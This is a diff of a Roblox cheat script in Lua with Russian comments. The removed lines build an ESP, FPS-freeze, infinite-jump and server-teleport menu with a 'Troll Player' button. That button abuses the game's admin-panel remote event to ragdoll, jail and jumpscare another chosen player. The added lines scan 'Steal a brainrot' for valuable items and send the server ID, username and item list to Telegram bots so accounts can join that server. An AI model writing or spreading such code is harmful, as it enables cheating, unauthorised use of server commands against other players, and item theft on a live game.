-    TweenService:Create(grad,TweenInfo.new(2,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true),{Offset=Vector2.new(1.1,0)}):Play()
-    local buttonArea = Instance.new('Frame',sidebar)
-    buttonArea.BackgroundTransparency = 1
-    buttonArea.Position = UDim2.new(0, 10, 0, 38)
-    buttonArea.Size = UDim2.new(1, -20, 1, -52)
-    local layout = Instance.new("UIListLayout",buttonArea)
-    layout.FillDirection = Enum.FillDirection.Vertical
-    layout.Padding = UDim.new(0,8)
-    btnFreeze = makeMenuButton("Freeze FPS", ICONS.Zap, false) btnFreeze.Name = "FreezeFPS"
-    btnESP = makeMenuButton("ESP",ICONS.Eye,true) btnESP.Name = "ESP"
-    btnCam = makeMenuButton("CameraUP (R)",ICONS.Camera,false) btnCam.Name = "CameraUP"
-    btnJump = makeMenuButton("Infinity Jump",ICONS.Jump,true) btnJump.Name = "InfinityJump" -- ПЕРЕИМЕНОВАНО И ВСЕГДА ВКЛЮЧЕНО
-    btnSelect = makeMenuButton("Выбрать игрока","",false) btnSelect.Name = "SelBtn"
-    btnPlayer = makeMenuButton("Player: None","",false) btnPlayer.Name = "PlBtn" btnPlayer.Visible = false
-    btnTroll = makeMenuButton("Troll Player","",false) btnTroll.Name = "TrollBtn" btnTroll.Visible = false
-    btnFreeze.Parent = buttonArea
-    btnESP.Parent = buttonArea
-    btnCam.Parent = buttonArea
-    btnJump.Parent = buttonArea
-    btnSelect.Parent = buttonArea
-    btnPlayer.Parent = buttonArea
-    btnTroll.Parent = buttonArea
-    btnESP.MouseButton1Click:Connect(function()
-        if heartbeatConnection then stopESP(); btnESP.BackgroundColor3 = UI_THEME.ButtonOff
-        else startESP(); btnESP.BackgroundColor3 = UI_THEME.ButtonOn end
-    end)
-    btnFreeze.MouseButton1Click:Connect(function()
-        if FPSDevourer.running then FPSDevourer:Stop() btnFreeze.BackgroundColor3 = UI_THEME.ButtonOff
-        else FPSDevourer:Start() btnFreeze.BackgroundColor3 = UI_THEME.ButtonOn end
-    end)
-    btnCam.MouseButton1Click:Connect(function()
-        if isCameraRaised then disableFollowCamera() btnCam.BackgroundColor3 = UI_THEME.ButtonOff
-        else enableFollowCamera() btnCam.BackgroundColor3 = UI_THEME.ButtonOn end
-        btnCam.Text = "   CameraUP (R)"
-    end)
-    -- УБРАН обработчик кнопки - Infinity Jump всегда включён
-    btnJump.MouseButton1Click:Connect(function()
-        -- Ничего не делаем - функция всегда активна
-        -- Можно добавить уведомление
-        btnJump.Text = "   No Animations!"
-        task.wait(1)
-        btnJump.Text = "   Infinity Jump"
-    end)
-    btnSelect.MouseButton1Click:Connect(function()
-        local popup = Instance.new("Frame",uiRoot)
-        popup.BackgroundColor3 = UI_THEME.PanelBg
-        popup.Size = UDim2.new(0, 220, 0, 190)
-        popup.Position = UDim2.new(0, 250, 0.5, -95)
-        popup.AnchorPoint = Vector2.new(0,0)
-        Instance.new("UICorner", popup).CornerRadius = UDim.new(0,9)
-        local border = Instance.new("UIStroke", popup)
-        border.Color = UI_THEME.PanelStroke
-        border.Thickness = 2
-        local header = Instance.new("TextLabel", popup)
-        header.BackgroundTransparency = 1
-        header.Text = "Список игроков"
-        header.Font = Enum.Font.GothamBold
-        header.TextSize = 16
-        header.TextColor3 = UI_THEME.Text
-        header.Size = UDim2.new(1, -28, 0, 28)
-        header.Position = UDim2.new(0,12,0,0)
-        header.TextXAlignment = Enum.TextXAlignment.Left
-        local close = Instance.new("TextButton", popup)
-        close.Text = "✕"
-        close.Font = Enum.Font.GothamBlack
-        close.TextSize = 17
-        close.Size = UDim2.new(0,26,0,26)
-        close.Position = UDim2.new(1, -30, 0, 2)
-        close.BackgroundTransparency = 1
-        close.TextColor3 = UI_THEME.Accent
-        close.AutoButtonColor = true
-        close.MouseButton1Click:Connect(function() popup:Destroy() end)
-        local scroll = Instance.new("ScrollingFrame", popup)
-        scroll.BackgroundTransparency = 1
-        scroll.Size = UDim2.new(1, -18, 1, -34)
-        scroll.Position = UDim2.new(0,9,0,32)
-        scroll.CanvasSize = UDim2.new(0,0,0,0)
-        scroll.ScrollBarThickness = 6
-        scroll.BottomImage,scroll.TopImage,scroll.MidImage = "","",""
-        scroll.BorderSizePixel = 0
-        local layout = Instance.new("UIListLayout", scroll)
-        layout.SortOrder = Enum.SortOrder.LayoutOrder
-        layout.Padding = UDim.new(0,3)
-        for _,plr in ipairs(Players:GetPlayers()) do
-            local f = Instance.new("Frame",scroll)
-            f.BackgroundColor3 = Color3.fromRGB(48,36,72)
-            f.Size = UDim2.new(1,0,0,32)
-            Instance.new("UICorner",f).CornerRadius=UDim.new(0,6)
-            local lbl = Instance.new("TextLabel",f)
-            lbl.BackgroundTransparency = 1 lbl.Size = UDim2.new(0.66,0,1,0)
-            lbl.Position = UDim2.new(0,10,0,0)
-            lbl.Text = plr.DisplayName ~= plr.Name and (plr.DisplayName.." ("..plr.Name..")") or plr.Name
-            lbl.Font = Enum.Font.Gotham lbl.TextSize = 15
-            lbl.TextColor3 = UI_THEME.Text lbl.TextXAlignment=Enum.TextXAlignment.Left
-            local sel = Instance.new("TextButton",f)
-            sel.Text = "Выбрать"
-            sel.Font = Enum.Font.GothamBold
-            sel.TextSize = 13
-            sel.Size = UDim2.new(0.266,0,0.7,0)
-            sel.Position = UDim2.new(0.71,0,0.16,0)
-            sel.BackgroundColor3 = UI_THEME.Accent
-            sel.TextColor3 = Color3.new(1,1,1)
-            sel.AutoButtonColor = true
-            Instance.new("UICorner",sel).CornerRadius = UDim.new(0,3)
-            sel.MouseButton1Click:Connect(function()
-                selectedPlayer = plr
-                btnPlayer.Text = "Player: "..plr.Name
-                btnPlayer.Visible = true
-                btnTroll.Visible = true
-                btnSelect.Visible = false
-                popup:Destroy()
-            end)
-        end
-        task.wait()
-        scroll.CanvasSize = UDim2.new(0,0,0,layout.AbsoluteContentSize.Y)
-    end)
-    btnPlayer.MouseButton1Click:Connect(function()
-        btnSelect.Visible = true
-        btnPlayer.Visible = false
-        btnTroll.Visible = false
-    end)
-    btnTroll.MouseButton1Click:Connect(function()
-        if not selectedPlayer then return end
-        local Event = ReplicatedStorage.Packages.Net["RE/AdminPanelService/ExecuteCommand"]
-        local plr = selectedPlayer
-        Event:FireServer(plr, "ragdoll")
-        task.spawn(function()
-            task.wait(4)
-            Event:FireServer(plr, "jail")
-            task.wait(9.5)
-            Event:FireServer(plr, "inverse")
-            task.wait(9)
-            Event:FireServer(plr, "rocket")
-            task.wait(3)
-            Event:FireServer(plr, "jumpscare")
-        end)
-    end)
-end
-if not CoreGui:FindFirstChild('PurpleESP_3D') then
-    esp3DRoot = Instance.new('ScreenGui'); esp3DRoot.Name = 'PurpleESP_3D'; esp3DRoot.Parent=CoreGui; esp3DRoot.ResetOnSpawn=false
-else
-    esp3DRoot = CoreGui:FindFirstChild('PurpleESP_3D')
-end
-buildUI()
-startESP()
-
--- == Camera toggle on R ==
-UserInputService.InputBegan:Connect(function(input,gp)
-    if gp then return end
-    if input.KeyCode==Enum.KeyCode.R then
-        if isCameraRaised then disableFollowCamera() btnCam.BackgroundColor3=UI_THEME.ButtonOff
-        else enableFollowCamera() btnCam.BackgroundColor3=UI_THEME.ButtonOn end
-        btnCam.Text = "   CameraUP (R)"
-    end
-end)
-
--- == Быстрый выбор инструментов (Z/X) ==
-local function equipToolByName(toolName)
-    local char = player.Character
-    local backpack = player:FindFirstChild("Backpack")
-    if not (char and backpack) then return end
-    local humanoid = char:FindFirstChildOfClass("Humanoid")
-    if not humanoid then return end
-    humanoid:UnequipTools()
-    local tool = backpack:FindFirstChild(toolName)
-    if tool and tool:IsA("Tool") then
-        humanoid:EquipTool(tool)
-    end
-end
-UserInputService.InputBegan:Connect(function(input, gp)
-    if gp then return end
-    if input.KeyCode == Enum.KeyCode.Z then
-        equipToolByName("Invisibility Cloak")
-    elseif input.KeyCode == Enum.KeyCode.X then
-        equipToolByName("Quantum Cloner")
-    end
-end)
-
--- == INPUT TELEPORT BY JOBID (Key T) - Centered & No AutoFocus + AutoTeleport ==
-local okTG, TeleportService = pcall(function() return game:GetService("TeleportService") end)
-local LocalPlayer = player
--- Переключатель между старыми и новыми API телепорта
-local USE_TELEPORT_ASYNC = false -- true для TeleportAsync + TeleportOptions.ServerInstanceId [docs recommend TeleportAsync]
--- Интервал авто-попыток
-local ATTEMPT_INTERVAL = 1.5
--- UUID паттерн 8-4-4-4-12
-local UUID_PATTERN = "^[%x][%x][%x][%x][%x][%x][%x][%x]%-[%x][%x][%x][%x]%-[%x][%x][%x][%x]%-[%x][%x][%x][%x]%-[%x][%x][%x][%x][%x][%x][%x][%x][%x][%x][%x][%x]$"
-local function parsePlaceAndJob(input)
-    if type(input) ~= "string" then return nil, nil, "Пустой ввод" end
-    local s = input:gsub("^%s+", ""):gsub("%s+$", "")
-    local placeStr, jobStr = s:match("TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*['\"]([%w%-]+)['\"]")
-    if placeStr and jobStr then
-        local placeId = tonumber(placeStr)
-        if not placeId then return nil, nil, "Некорректный placeId" end
-        if not jobStr:match(UUID_PATTERN) then return nil, nil, "Некорректный JobId" end
-        return placeId, jobStr, nil
-    end
-    if s:match(UUID_PATTERN) then
-        return tonumber(game.PlaceId), s, nil
-    end
-    -- Вариант "placeId | jobId"
-    local p2, j2 = s:match("^(%d+)%s*[|,;%s]%s*([%w%-]+)$")
-    if p2 and j2 and j2:match(UUID_PATTERN) then
-        return tonumber(p2), j2, nil
-    end
-    return nil, nil, "Неверный ввод (ожидается JobId или placeId, JobId)"
-end
--- Общая функция одного телепорта
-local function teleportOnce(placeId, jobId)
-    if not okTG or not TeleportService then
-        return false, "TeleportService недоступен"
-    end
-    local ok, err = pcall(function()
-        if USE_TELEPORT_ASYNC then
-            local TeleportOptions = Instance.new("TeleportOptions")
-            TeleportOptions.ServerInstanceId = jobId -- InstanceId (JobId)
-            TeleportService:TeleportAsync(placeId, {LocalPlayer}, TeleportOptions)
         else
-            TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
+            table.insert(traits, tostring(traitsAttr))
         end
-    end)
-    if ok then
-        return true, nil
+    end
+    
+    for _, child in ipairs(obj:GetDescendants()) do
+        if child:IsA("StringValue") and (child.Name == "Trait" or child.Name == "Traits") then
+            table.insert(traits, child.Value)
+        end
+    end
+    
+    for _, child in ipairs(obj:GetDescendants()) do
+        if child:IsA("ObjectValue") and (child.Name == "Trait" or child.Name == "Traits") and child.Value then
+            table.insert(traits, child.Value.Name)
+        end
+    end
+    
+    return traits
+end
+
+
+local function scanObject(obj)
+    if not obj or not obj.Parent then return nil end
+    
+    -- Пропуск проверки прозрачности для "Garama and Madundung" и "La Supreme Combinasion"
+    if obj.Name == "Garama and Madundung" or obj.Name == "La Supreme Combinasion" then
+        print(obj.Name .. ": проверка прозрачности пропущена")
     else
-        return false, tostring(err)
+        -- Проверка прозрачности только для частей Cube.
+        if not checkCubeTransparency(obj) then
+            print(obj.Name .. ": найдены части Cube с высокой прозрачностью (>0.40), уведомление не отправляется")
+            return nil
+        end
+    end
+    
+    local mutation = findMutation(obj)
+    local traits = findTraits(obj)
+    local baseIncomeStr = OBJECT_INCOME[obj.Name] or "0/s"
+    local baseIncome = incomeToNumber(baseIncomeStr)
+    
+    -- Раздельные множители
+    local mutationMultiplier = 1
+    local traitsMultiplier = 1
+    local appliedMutation = {}
+    local appliedTraits = {}
+
+    -- Применяем множитель мутации
+    if mutation and MUTATION_MULTIPLIERS[mutation] then
+        mutationMultiplier = MUTATION_MULTIPLIERS[mutation]
+        table.insert(appliedMutation, mutation.." (x"..MUTATION_MULTIPLIERS[mutation]..")")
+    end
+
+    -- Применяем множители трейтов
+    for _, trait in ipairs(traits) do
+        if TRAIT_MULTIPLIERS[trait] then
+            traitsMultiplier = traitsMultiplier * TRAIT_MULTIPLIERS[trait]
+            table.insert(appliedTraits, trait.." (x"..TRAIT_MULTIPLIERS[trait]..")")
+        end
+    end
+
+    -- Рассчитываем итоговый доход (формула: base * mutation + base * (traits - 1))
+    local finalIncome = baseIncome
+    if baseIncomeStr ~= "???/s" then
+        finalIncome = baseIncome * mutationMultiplier + baseIncome * (traitsMultiplier - 1)
+    end
+
+    return {
+        name = obj.Name,
+        mutation = mutation,
+        traits = traits,
+        baseIncome = baseIncomeStr,
+        finalIncome = formatIncomeNumber(finalIncome),
+        mutationMultiplier = mutationMultiplier,
+        traitsMultiplier = traitsMultiplier,
+        appliedMutation = appliedMutation,
+        appliedTraits = appliedTraits,
+        numericIncome = finalIncome
+    }
+end
+
+local function createColoredText(objData)
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(0, 350, 0, 50)
+    textLabel.BackgroundTransparency = 1
+    textLabel.TextSize = ESP_SETTINGS.TextSize
+    textLabel.Font = ESP_SETTINGS.Font
+    textLabel.TextXAlignment = Enum.TextXAlignment.Left
+    textLabel.TextStrokeTransparency = 0.3
+    
+    local emoji = OBJECT_EMOJIS[objData.name] or "🔹"
+    local incomeText = objData.finalIncome ~= "???/s" and objData.finalIncome or "???"
+    
+    local richText = string.format(
+        '<font color="rgb(255,255,255)">%s%s %s: %s</font>',
+        emoji, getMutationEmoji(objData.mutation), objData.name, incomeText
+    )
+    
+    -- Показываем мутации и трейты с их множителями
+    if objData.mutation and MUTATION_MULTIPLIERS[objData.mutation] then
+        richText = richText .. string.format(
+            '\n<font color="rgb(255,255,150)">%s x%.2f</font>',
+            objData.mutation, objData.mutationMultiplier
+        )
+    end
+    
+    if #objData.traits > 0 then
+        richText = richText .. '\n<font color="rgb(150,255,150)">'
+        for _, trait in ipairs(objData.traits) do
+            if TRAIT_MULTIPLIERS[trait] then
+                richText = richText .. string.format('%s x%.2f ', trait, TRAIT_MULTIPLIERS[trait])
+            else
+                richText = richText .. trait .. ' '
+            end
+        end
+        richText = richText .. '</font>'
+    end
+    
+    textLabel.Text = richText
+    textLabel.RichText = true
+    return textLabel
+end
+
+local function createESPElement(obj)
+    local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
+    if not rootPart then return end
+
+    local billboard = Instance.new("BillboardGui")
+    billboard.Size = UDim2.new(0, 350, 0, 80)
+    billboard.AlwaysOnTop = true
+    billboard.MaxDistance = ESP_SETTINGS.MaxDistance
+    billboard.StudsOffset = Vector3.new(0, 3, 0)
+    
+    local objData = scanObject(obj)
+    local textLabel = createColoredText(objData)
+    textLabel.Parent = billboard
+    
+    billboard.Adornee = rootPart
+    billboard.Parent = screenGui
+    
+    return {
+        labelGui = billboard,
+        label = textLabel,
+        rootPart = rootPart,
+        object = obj,
+        data = objData
+    }
+end
+
+local function canSendNotification(botType)
+    local currentServer = getServerId()
+    local now = os.time()
+    local lastNotificationTime = botType == "main" and lastNotificationTimeMain or lastNotificationTimeSpecial
+    
+    if currentServer == lastServerNotified and now - lastNotificationTime < 7 then
+        return false
+    end
+    
+    if botType == "main" then
+        lastNotificationTimeMain = now
+    else
+        lastNotificationTimeSpecial = now
+    end
+    lastServerNotified = currentServer
+    return true
+end
+
+local function sendMainTelegramAlert()
+    if not TG_MAIN.Enabled or not request or #objectsToNotifyMain == 0 then return end
+    if not canSendNotification("main") then return end
+    
+    local serverId = getServerId()
+    local username = getAccountInfo()
+    
+    local importantObjects = {}
+    local regularObjects = {}
+    
+    for _, objData in ipairs(objectsToNotifyMain) do
+        if TG_MAIN.ImportantObjects[objData.name] then
+            table.insert(importantObjects, objData)
+        else
+            table.insert(regularObjects, objData)
+        end
+    end
+    
+    local message = string.format(
+        "*🔍 Обнаружены объекты в Steal a brainrot*\n"..
+        "👤 Игрок: `@%s`\n"..
+        "🌐 Сервер: `%s`\n"..
+        "🕘 Время: `%s`\n\n",
+        username, serverId, os.date("%X")
+    )
+    
+    if #importantObjects > 0 then
+        message = message .. "*🚨 ВАЖНЫЕ ОБЪЕКТЫ:*\n"
+        for _, objData in ipairs(importantObjects) do
+            local emoji = OBJECT_EMOJIS[objData.name] or "⚠️"
+            local mutationEmoji = getMutationEmoji(objData.mutation)
+            
+            message = message .. string.format("%s%s %s (%s)", emoji, mutationEmoji, objData.name, objData.finalIncome)
+            
+            if #objData.traits > 0 then
+                message = message .. " " .. table.concat(objData.traits, " ")
+            end
+            
+            message = message .. "\n"
+        end
+        message = message .. "\n"
+    end
+    
+    if #regularObjects > 0 then
+        message = message .. "*🔹 Обычные объекты:*\n"
+        for _, objData in ipairs(regularObjects) do
+            local emoji = OBJECT_EMOJIS[objData.name] or "🔸"
+            local mutationEmoji = getMutationEmoji(objData.mutation)
+            
+            message = message .. string.format("%s%s %s (%s)", emoji, mutationEmoji, objData.name, objData.finalIncome)
+            
+            if #objData.traits > 0 then
+                message = message .. " " .. table.concat(objData.traits, " ")
+            end
+            
+            message = message .. "\n"
+        end
+    end
+    
+    if serverId ~= "Одиночная игра" then
+        message = message .. string.format(
+            "\n🚀 Телепорт:\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
+            serverId
+        )
+    end
+    
+    request({
+        Url = "https://api.telegram.org/bot"..TG_MAIN.Token.."/sendMessage",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({
+            chat_id = TG_MAIN.ChatId,
+            text = message,
+            parse_mode = "Markdown"
+        })
+    })
+end
+
+local function sendSpecialTelegramAlert()
+    if not TG_SPECIAL.Enabled or not request or #objectsToNotifySpecial == 0 then return end
+    if not canSendNotification("special") then return end
+    
+    local serverId = getServerId()
+    local username = getAccountInfo()
+    
+    local message = string.format(
+        "*🔍 Обнаружены объекты в Steal a brainrot*\n"..
+        "👤 Игрок: `@%s`\n"..
+        "🌐 Сервер: `%s`\n"..
+        "🕘 Время: `%s`\n\n"..
+        "*🔸 Объекты с низким доходом:*\n",
+        username, serverId, os.date("%X")
+    )
+    
+    for _, objData in ipairs(objectsToNotifySpecial) do
+        local emoji = OBJECT_EMOJIS[objData.name] or "🔸"
+        local mutationEmoji = getMutationEmoji(objData.mutation)
+        
+        message = message .. string.format("%s%s %s (%s)", emoji, mutationEmoji, objData.name, objData.finalIncome)
+        
+        if #objData.traits > 0 then
+            message = message .. " " .. table.concat(objData.traits, " ")
+        end
+        
+        message = message .. "\n"
+    end
+    
+    if serverId ~= "Одиночная игра" then
+        message = message .. string.format(
+            "\n🚀 Телепорт:\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
+            serverId
+        )
+    end
+    
+    request({
+        Url = "https://api.telegram.org/bot"..TG_SPECIAL.Token.."/sendMessage",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({
+            chat_id = TG_SPECIAL.ChatId,
+            text = message,
+            parse_mode = "Markdown"
+        })
+    })
+end
+
+local function playDetectionSound()
+    local sound = Instance.new("Sound")
+    sound.SoundId = ESP_SETTINGS.SoundId
+    sound.Volume = ESP_SETTINGS.SoundVolume
+    sound.Parent = workspace
+    sound:Play()
+    game:GetService("Debris"):AddItem(sound, 3)
+end
+
+local function updateESP(deltaTime)
+    lastUpdate = lastUpdate + deltaTime
+    if lastUpdate < ESP_SETTINGS.UpdateInterval then return end
+    lastUpdate = 0
+
+    -- Очистка кэша
+    for obj, data in pairs(espCache) do
+        if not obj.Parent or not data.rootPart.Parent then
+            data.labelGui:Destroy()
+            espCache[obj] = nil
+            foundObjects[obj] = nil
+        end
+    end
+
+    -- Сброс списков для уведомлений перед новым сканированием
+    objectsToNotifyMain = {}
+    objectsToNotifySpecial = {}
+
+    -- Поиск объектов
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
+            local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
+            if not rootPart then continue end
+
+            local distance = (rootPart.Position - camera.CFrame.Position).Magnitude
+            if distance > ESP_SETTINGS.MaxDistance then
+                if espCache[obj] then
+                    espCache[obj].labelGui.Enabled = false
+                end
+                continue
+            end
+
+            local isNewObject = not foundObjects[obj]
+            foundObjects[obj] = true
+
+            if not espCache[obj] then
+                espCache[obj] = createESPElement(obj)
+                local objData = espCache[obj].data
+                if objData then
+                    playDetectionSound()
+                    
+                    -- Добавляем в соответствующий список для уведомлений
+                    if TG_MAIN.ImportantObjects[obj.Name] or objData.numericIncome >= 25000000 then
+                        table.insert(objectsToNotifyMain, objData)
+                    else
+                        table.insert(objectsToNotifySpecial, objData)
+                    end
+                end
+            end
+
+            -- Обновление видимости ESP
+            local data = espCache[obj]
+            local _, onScreen = camera:WorldToViewportPoint(rootPart.Position)
+            data.labelGui.Enabled = onScreen
+        end
+    end
+    
+    -- Отправка уведомлений (независимо друг от друга)
+    if #objectsToNotifyMain > 0 then
+        sendMainTelegramAlert()
+    end
+    
+    if #objectsToNotifySpecial > 0 then
+        sendSpecialTelegramAlert()
     end
 end
--- Подписка на ошибки и статусы
-local lastTeleportStatus = ""
-local function setStatus(lbl, txt)
-    lastTeleportStatus = txt or ""
-    if lbl then lbl.Text = txt or "" end
-end
--- Реакция на TeleportInitFailed (по докам можно ретраить) 
-if okTG and TeleportService then
-    TeleportService.TeleportInitFailed:Connect(function(plr, result, msg, placeId, teleOpts)
-        if plr == LocalPlayer then
-            lastTeleportStatus = ("TeleportInitFailed: %s"):format(tostring(result))
-        end
+
+-- Запуск системы
+RunService.Heartbeat:Connect(updateESP)
+
+-- Обработка игроков
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function()
+        updateESP(0)
     end)
-end
--- Создание окна
-local function safeCreatePrompt()
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "JobIdTeleportPrompt"
-    gui.ResetOnSpawn = false
-    gui.Parent = CoreGui
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 480, 0, 182)
-    frame.AnchorPoint = Vector2.new(0.5, 0.5)
-    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-    frame.BackgroundColor3 = UI_THEME.PanelBg
-    frame.Active = true
-    frame.ClipsDescendants = true
-    frame.Parent = gui
-    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
-    local stroke = Instance.new("UIStroke", frame)
-    stroke.Color = UI_THEME.PanelStroke
-    stroke.Thickness = 2
-    local header = Instance.new("TextLabel")
-    header.Name = "Header"
-    header.BackgroundTransparency = 1
-    header.Text = "Введите ID"
-    header.Font = Enum.Font.GothamBold
-    header.TextSize = 18
-    header.TextColor3 = UI_THEME.Text
-    header.TextXAlignment = Enum.TextXAlignment.Left
-    header.Size = UDim2.new(1, -36, 0, 28)
-    header.Position = UDim2.new(0, 12, 0, 10)
-    header.Parent = frame
-    local close = Instance.new("TextButton")
-    close.Text = "✕"
-    close.Font = Enum.Font.GothamBlack
-    close.TextSize = 18
-    close.Size = UDim2.new(0, 26, 0, 26)
-    close.Position = UDim2.new(1, -30, 0, 8)
-    close.BackgroundTransparency = 1
-    close.TextColor3 = UI_THEME.Accent
-    close.Parent = frame
-    close.MouseButton1Click:Connect(function() gui:Destroy() end)
-    local inputRow = Instance.new("Frame")
-    inputRow.BackgroundTransparency = 1
-    inputRow.Size = UDim2.new(1, -24, 0, 36)
-    inputRow.AnchorPoint = Vector2.new(0.5, 0.5)
-    inputRow.Position = UDim2.new(0.5, 0, 0.5, -8)
-    inputRow.Parent = frame
-    local box = Instance.new("TextBox")
-    box.Font = Enum.Font.Gotham
-    box.PlaceholderText = "Примеры: 123456|job-uuid ... или просто job-uuid"
-    box.Text = ""
-    box.TextSize = 14
-    box.TextColor3 = UI_THEME.Text
-    box.BackgroundColor3 = Color3.fromRGB(30, 22, 46)
-    box.Size = UDim2.new(1, -150, 0, 32)
-    box.AnchorPoint = Vector2.new(0, 0.5)
-    box.Position = UDim2.new(0, 12, 0.5, 0)
-    box.ClearTextOnFocus = false
-    box.Parent = inputRow
-    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 8)
-    local boxStroke = Instance.new("UIStroke", box)
-    boxStroke.Color = UI_THEME.Accent2
-    boxStroke.Thickness = 1
-    local status = Instance.new("TextLabel")
-    status.BackgroundTransparency = 1
-    status.Text = ""
-    status.Font = Enum.Font.Gotham
-    status.TextSize = 13
-    status.TextColor3 = Color3.fromRGB(255, 200, 200)
-    status.TextXAlignment = Enum.TextXAlignment.Left
-    status.Size = UDim2.new(1, -24, 0, 20)
-    status.Position = UDim2.new(0, 12, 1, -52)
-    status.Parent = frame
-    -- Кнопка Teleport (многоразовая) — окно не закрываем
-    local go = Instance.new("TextButton")
-    go.Text = "Teleport"
-    go.Font = Enum.Font.GothamBold
-    go.TextSize = 15
-    go.TextColor3 = Color3.new(1,1,1)
-    go.BackgroundColor3 = UI_THEME.Accent
-    go.Size = UDim2.new(0, 110, 0, 30)
-    go.AnchorPoint = Vector2.new(1, 1)
-    go.Position = UDim2.new(1, -12, 1, -10)
-    Instance.new("UICorner", go).CornerRadius = UDim.new(0, 8)
-    go.Parent = frame
-    -- Тумблер AutoTeleport
-    local auto = Instance.new("TextButton")
-    auto.Text = "AutoTeleport: OFF"
-    auto.Font = Enum.Font.GothamBold
-    auto.TextSize = 14
-    auto.TextColor3 = UI_THEME.Text
-    auto.BackgroundColor3 = UI_THEME.ButtonOff
-    auto.Size = UDim2.new(0, 140, 0, 30)
-    auto.AnchorPoint = Vector2.new(1, 1)
-    auto.Position = UDim2.new(1, -134, 1, -10)
-    Instance.new("UICorner", auto).CornerRadius = UDim.new(0, 8)
-    auto.Parent = frame
-    local busy = false
-    local autoOn = false
-    local autoThread = nil
-    local function parseNow()
-        local placeId, jobId, err = parsePlaceAndJob(box.Text)
-        if err then
-            setStatus(status, "Ошибка: "..err)
-            return nil, nil
-        end
-        return placeId, jobId
-    end
-    local function doTeleport()
-        if busy then
-            setStatus(status, "Идёт попытка...")
+end)
+
+-- Обработчик клавиши сканера
+UserInputService.InputBegan:Connect(function(input)
+    if input.KeyCode == SCANNER_SETTINGS.ScanKey then
+        local now = os.time()
+        if now - lastScanTime < SCANNER_SETTINGS.DebounceTime then
+            print("Подождите...")
             return
         end
-        local placeId, jobId = parseNow()
-        if not placeId or not jobId then return end
-        busy = true
-        setStatus(status, ("Телепорт в %d | %s ..."):format(placeId, jobId))
-        local ok, err = teleportOnce(placeId, jobId)
-        if ok then
-            setStatus(status, "Телепорт вызван, ждём загрузки...")
-            -- ВАЖНО: окно НЕ закрываем; оставляем для повторных нажатий
-        else
-            setStatus(status, "Не удалось: "..tostring(err))
-        end
-        busy = false
-    end
-    go.MouseButton1Click:Connect(doTeleport)
-    box.FocusLost:Connect(function(enter) if enter then doTeleport() end end)
-    local function startAuto()
-        if autoOn then return end
-        autoOn = true
-        auto.Text = "AutoTeleport: ON"
-        auto.BackgroundColor3 = UI_THEME.ButtonOn
-        setStatus(status, "Автотелепорт включён")
-        autoThread = task.spawn(function()
-            while autoOn do
-                local placeId, jobId = parseNow()
-                if placeId and jobId then
-                    if not busy then
-                        busy = true
-                        local ok, err = teleportOnce(placeId, jobId)
-                        if ok then
-                            setStatus(status, "Авто: вызван телепорт...")
-                        else
-                            setStatus(status, "Авто: ошибка — "..tostring(err))
-                        end
-                        busy = false
+        
+        lastScanTime = now
+        print("\n🔍 Начинаем сканирование всех объектов...")
+        
+        local foundCount = 0
+        
+        for _, obj in ipairs(workspace:GetDescendants()) do
+            if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
+                local details = scanObject(obj)
+                if details then
+                    foundCount = foundCount + 1
+                    print("\n=== ОБЪЕКТ #"..foundCount.." ===")
+                    print("Имя:", details.name)
+                    print("Доход:", details.finalIncome)
+                    if details.mutation then
+                        print("Мутация:", details.mutation.." (x"..details.mutationMultiplier..")")
                     end
-                else
-                    -- Некорректный ввод — просто ждём
-                end
-                local t0 = tick()
-                while tick() - t0 < ATTEMPT_INTERVAL do
-                    if not autoOn then break end
-                    RunService.Heartbeat:Wait()
+                    print("Traits ("..#details.traits.."):")
+                    for i, trait in ipairs(details.traits) do
+                        local multiplier = TRAIT_MULTIPLIERS[trait] and " (x"..TRAIT_MULTIPLIERS[trait]..")" or ""
+                        print(i..".", trait..multiplier)
+                    end
                 end
             end
-        end)
-    end
-    local function stopAuto()
-        autoOn = false
-        auto.Text = "AutoTeleport: OFF"
-        auto.BackgroundColor3 = UI_THEME.ButtonOff
-        setStatus(status, "Автотелепорт выключен")
-        autoThread = nil
-    end
-    auto.MouseButton1Click:Connect(function()
-        if autoOn then stopAuto() else startAuto() end
-    end)
-    return gui
-end
--- Тоггл окна на T
-UserInputService.InputBegan:Connect(function(input, gp)
-    if gp then return end
-    if input.KeyCode == Enum.KeyCode.T then
-        local existing = CoreGui:FindFirstChild("JobIdTeleportPrompt")
-        if existing then
-            existing.Enabled = not existing.Enabled
+        end
+        
+        if foundCount == 0 then
+            print("❌ Объекты не найдены")
         else
-            local okP, guiOrErr = pcall(function() return safeCreatePrompt() end)
-            if not okP then
-                warn("[TeleportPrompt] "..tostring(guiOrErr))
-            end
+            print("\n=== РЕЗУЛЬТАТ ===")
+            print("Найдено объектов:", foundCount)
         end
     end
 end)
 
-print("🚀 Улучшенный скрипт загружен!")
-print("✅ HTTP блокировщик активен")
-print("✅ INFINITY JUMP: всегда включен, быстрое падение!")
-print("   - Зажимайте ПРОБЕЛ для прыжка вверх (скорость 32)")
